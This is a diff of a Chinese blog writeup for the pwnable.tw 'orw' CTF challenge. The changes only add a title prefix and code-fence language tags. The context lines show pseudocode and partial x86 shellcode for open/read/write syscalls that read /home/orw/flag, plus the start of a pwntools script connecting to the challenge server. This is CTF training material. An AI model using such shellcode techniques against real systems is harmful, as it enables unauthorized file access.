@@ -1,5 +1,5 @@
 ---
-title: pwnable.tw orw writeup
+title: CTF|pwnable.tw orw writeup
 date: 2018-03-14 12:32:31
 tags: pwn
 categories: CTF
@@ -8,17 +8,18 @@ pwnable.tw orw writeup shellcode的编写
 <!-- more -->
 呀真的好久没有写博客了，最近在做一些题，都在看别人的题解，做过也忘了，接下来希望好好记录一下，帮助自己理解。
 
-这道题是有关shellcode的编写，这部分我之前也没学习过，都是使用机器生成的。就...结合别人的writeup 说一下自己的理解吧。
+这道题是有关`shellcode`的编写，这部分我之前也没学习过，都是使用机器生成的。就...结合别人的writeup 说一下自己的理解吧。
 
 高级语言形式
-```
+```c
 char *fn = "/home/orw/flag";
 sys_open(fn,0,0)
 sys_read(3,fn,0x30)
 sys_write(1,fn,0x30)
 ```
 查看 [linux 系统调用](http://syscalls.kernelgrok.com/) 获得各个函数的调用号
-```
+
+```x86asm
 首先是第一部分 sys_open
 xor ecx,ecx ;清空ecx寄存器
 mov eax,0x5;查看以上资料知道 sys_open 对应0x5
@@ -46,7 +47,7 @@ int 0x80
 
 ```
 最后的脚本：
-```
+```python
 from pwn import *
 io = remote('chall.pwnable.tw',10001)
 shellcode = ''
